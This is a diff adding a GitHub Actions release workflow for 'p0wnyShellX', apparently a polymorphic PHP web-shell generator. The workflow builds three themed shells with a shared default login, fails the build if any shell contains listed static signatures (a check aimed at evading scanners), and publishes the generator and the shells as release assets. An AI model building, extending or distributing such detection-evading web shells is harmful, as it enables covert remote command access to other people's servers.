@@ -1,0 +1,91 @@
+name: Release
+
+on:
+  push:
+    tags:
+      - 'v*.*.*'
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Set up PHP
+        uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.3'
+
+      - name: Generate example shells (one per theme)
+        run: |
+          python3 p0wnyShellX.py -p "changeme666" -u sysadmin -t infra-dark   -j 40 -o example_infra-dark.php
+          python3 p0wnyShellX.py -p "changeme666" -u sysadmin -t corporate-blue -j 40 -o example_corporate-blue.php
+          python3 p0wnyShellX.py -p "changeme666" -u sysadmin -t matrix        -j 40 -o example_matrix.php
+
+      - name: PHP syntax validation
+        run: |
+          php -l example_infra-dark.php
+          php -l example_corporate-blue.php
+          php -l example_matrix.php
+
+      - name: Verify no static signatures in examples
+        run: |
+          SIGNATURES=("fetchContentBlock" "_resolveTask" "SESSION_ACTIVE" "feature=shell" "pipeCall-cmd" "panel-stream")
+          for f in example_infra-dark.php example_corporate-blue.php example_matrix.php; do
+            for sig in "${SIGNATURES[@]}"; do
+              if grep -q "$sig" "$f"; then
+                echo "FAIL: static signature '$sig' in $f"
+                exit 1
+              fi
+            done
+          done
+
+      - name: Extract tag version
+        id: version
+        run: echo "VERSION=${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
+
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ steps.version.outputs.VERSION }}
+          name: p0wnyShellX ${{ steps.version.outputs.VERSION }}
+          body: |
+            ## p0wnyShellX ${{ steps.version.outputs.VERSION }}
+
+            ### Assets
+
+            | File | Description |
+            |---|---|
+            | `p0wnyShellX.py` | Polymorphic generator — requires Python 3.8+ and PHP 8.x CLI |
+            | `example_infra-dark.php` | Pre-generated shell — infra-dark theme |
+            | `example_corporate-blue.php` | Pre-generated shell — corporate-blue theme |
+            | `example_matrix.php` | Pre-generated shell — matrix theme |
+
+            ### Example shell credentials
+            > These examples use default credentials. **Change them before any deployment.**
+
+            - **Username:** `sysadmin`
+            - **Password:** `changeme666`
+
+            ### Generate your own
+
+            ```bash
+            python3 p0wnyShellX.py -p "YourPassword!" -u youruser -o shell.php
+            ```
+
+            ### Requirements
+            - Python 3.8+
+            - PHP 8.x CLI (for bcrypt hash computation at build time)
+          files: |
+            p0wnyShellX.py
+            example_infra-dark.php
+            example_corporate-blue.php
+            example_matrix.php
